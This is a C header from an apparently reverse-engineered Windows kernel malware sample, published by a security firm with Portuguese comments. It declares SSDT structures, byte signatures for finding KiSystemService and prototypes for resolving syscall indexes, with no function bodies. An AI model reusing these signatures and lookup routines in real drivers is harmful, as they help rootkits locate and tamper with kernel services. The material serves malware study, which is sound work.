/*
 _   __ _____ _____  _    _ _   _
| | / /|  ___|  _  || |  | | | | |
| |/ / | |__ | | | || |  | | | | |
|    \ |  __|| | | || |/\| | | | |
| |\  \| |___\ \_/ /\  /\  / |_| |
\_| \_/\____/ \___/  \/  \/ \___/
                            2023
Copyright (c) Fluxuss Cyber Tech Desenvolvimento de Software, SLU (FLUXUSS)
Copyright (c) Fluxuss Software Security, LLC

! Reversed Soruce code from the original malware and maybe not equivalent the original source code.
*/

#pragma once
#include <ntifs.h>
#include "PeFile.h"

typedef struct _SYSTEM_MODULE_ENTRY {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} SYSTEM_MODULE_ENTRY, * PSYSTEM_MODULE_ENTRY;

#pragma warning(disable:4200)
typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG Count;
    SYSTEM_MODULE_ENTRY Module[0];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

#define SystemModuleInformation 0x0B

typedef NTSTATUS(*QUERY_INFO_PROCESS) (
    __in HANDLE ProcessHandle,
    __in PROCESSINFOCLASS ProcessInformationClass,
    __out_bcount(ProcessInformationLength) PVOID ProcessInformation,
    __in ULONG ProcessInformationLength,
    __out_opt PULONG ReturnLength
    );

QUERY_INFO_PROCESS ZwQueryInformationProcess;

NTSTATUS NTAPI ZwQuerySystemInformation(ULONG SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);

PIMAGE_NT_HEADERS NTAPI RtlImageNtHeader(IN PVOID Base);

struct _struct_malware {
    PVOID pMemBuffer;
    unsigned __int64 image_base_ntdll;
    unsigned __int64 section_range;
    unsigned int fileLowPart;
} struct_malware;

typedef struct _SSDTStruct {
    LONG* pServiceTable;
    PVOID pCounterTable;
    ULONGLONG NumberOfServices;
    PCHAR pArgumentTable;
} SSDTStruct, * PSSDTStruct;

//Outras duas assinaturas usadas pelo malware para encontrar a KiSystemService(SSDT)
/////////////////////////////////////////////
static unsigned char KiSystemServiceStartCodePattern[] = { 0x8B, 0xF8, 0xC1, 0xEF, 0x07, 0x83, 0xE7, 0x20, 0x25, 0xFF, 0x0F, 0x00, 0x00 }; // Mais precisa(Para deixar o projeto estável)

//As demais abaixo precisam ser bsucadas entre os ranges -> ZwUnloadKey - 86016   e  ZwUnloadKey + 77824 (Faça a busca pela assinatura neste range)
//O fator de busca é o endereço de ZwUnloadKey -> use MmGetSystemRoutineAddress ao seu favor.
static unsigned char KiSystemServiceStartCodePatternViaZwUnloadKeyNTOSBiggerOrEqual12[] = { 0xD3, 0x41, 0x3B, 0x44, 0x3A, 0x10, 0x0F, 0x83 };

static unsigned char KiSystemServiceStartCodePatternViaZwUnloadKeyNTOSBelowThan12[] = { 0xD3, 0x42, 0x3B, 0x44, 0x17, 0x10, 0x0F, 0x83 };
/////////////////////////////////////////////

unsigned int FixRVAThings(IMAGE_NT_HEADERS64* imgNtH, unsigned int uiVirtualAddress, unsigned int uiFileLowPart);

unsigned int ParsePeFileExport(IMAGE_DOS_HEADER* pDosH, unsigned int uiFileLowPart, const char* chNameExport, unsigned __int64* pImageBaseNtdll);

PVOID allocate_and_set_memory(char bFlag, SIZE_T szMemRegion);

NTSTATUS OpenNtdllAndParsePE(const char* chNameSyscall, const WCHAR* wNameSyscall);

unsigned int FindSyscallIndexOnSsdt(const char* nameexport);

PVOID GetNtOsKrnl(PULONG puImageSize);

PSSDTStruct GetFunction();

PVOID GetFunctionAddress(const char* apiname);